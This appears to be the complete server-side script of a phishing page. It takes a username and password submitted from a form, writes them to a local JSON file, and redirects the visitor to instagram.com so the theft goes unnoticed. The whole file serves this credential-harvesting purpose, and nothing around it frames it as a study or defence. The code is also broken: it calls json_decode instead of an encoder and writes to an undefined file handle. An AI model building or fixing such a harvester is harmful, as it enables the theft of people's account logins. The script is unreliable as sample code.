<?php

$user = $_POST['username'];
$pass = $_POST['password'];
$data['dev'] = array('username' => $user, 'password'=>$pass);

$jdata = json_decode($data);

$file = fopen('userdata.json', 'w');
fwrite($f,$jdata);
fclose($file);

header('Location: https://instagram.com');
exit();

?>
